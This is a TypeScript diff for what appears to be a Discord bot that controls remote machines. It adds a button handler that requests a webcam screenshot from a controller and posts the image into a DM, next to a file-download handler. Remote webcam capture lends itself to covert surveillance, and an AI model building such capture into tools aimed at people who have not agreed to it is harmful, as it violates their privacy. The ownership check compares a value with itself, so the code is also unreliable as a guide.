@@ -3,9 +3,11 @@ import HttpClient from "@/clients/HttpClient";
 import { ButtonWsServiceHandlers } from "@/services/ws/WsServiceHandlers";
 import { emojis } from "@/shared";
 import { Logger } from "@/shared/Logger";
+import { type GetWebcamScreenshotEvent } from "@/types/ws-events.types";
 import { type AxiosError } from "axios";
 import {
 	ActionRowBuilder,
+	AttachmentBuilder,
 	type ButtonComponent,
 	type ButtonInteraction,
 	ModalBuilder,
@@ -74,24 +76,57 @@ export const buttonHandler = async (
 		if (interaction.customId.startsWith("webcam-")) {
 			const [, webcamId, messageid] = interaction.customId.split("-");
 
-			await HttpClient.axios
-				.get({
-					url: `/controllers/${controllerid}/camera-screenshot?webcamId=${webcamId}`
-				})
-				.catch(async (err: unknown) => {
-					const adapterError = (err as AxiosError).response?.data;
-					Logger.error("Error sending screenshot webcam", JSON.stringify(adapterError));
-					await interaction.update({
-						content: `${emojis.Error} Error sending webcam screenshot`
+			try {
+				await interaction.deferUpdate(); // Acknowledge the interaction to prevent "interaction failed" error
+
+				await HttpClient.axios
+					.get({
+						url: `/controllers/${controllerid}/camera-screenshot?webcamId=${webcamId}`
+					})
+					.catch(async (err: unknown) => {
+						const adapterError = (err as AxiosError).response?.data;
+						Logger.error("Error sending screenshot webcam", JSON.stringify(adapterError));
+						await interaction.editReply({
+							content: `${emojis.Error} Error sending webcam screenshot`
+						});
+
+						if (adapterError.status === 409) {
+							await interaction.editReply({
+								content: `${emojis.Error} You are not authorized to run this command`
+							});
+						}
 					});
 
-					if (adapterError.status === 409) {
-						await interaction.update({
-							content: `${emojis.Error} You are not authorized to run this command`
+				ws.once("getWebcamScreenshot", async (data: GetWebcamScreenshotEvent) => {
+					const { controllerid, screenshot } = data;
+
+					if (controllerid === data.controllerid) {
+						const owner = await client.users.fetch(controllerid);
+						const dmChannel = await owner.createDM();
+
+						await dmChannel.messages.fetch(messageid).then(async (message) => {
+							if (!message) return console.log("No message found.");
+							const imageStream = Buffer.from(screenshot.split(',')[1], 'base64');
+							const attachment = new AttachmentBuilder(imageStream, {
+								name: "output.png"
+							});
+
+							await message.edit({
+								content: ``,
+								embeds: [],
+								files: [attachment]
+							});
 						});
 					}
 				});
+			} catch (err: unknown) {
+				Logger.error("Error handling webcam button interaction", err);
+				await interaction.editReply({
+					content: `${emojis.Error} An error occurred while processing your request.`
+				});
+			}
 		}
+
 
 		if (interaction.customId === "explorer-files-download") {
 			const modal = new ModalBuilder().setCustomId("download-modal").setTitle("Download File");
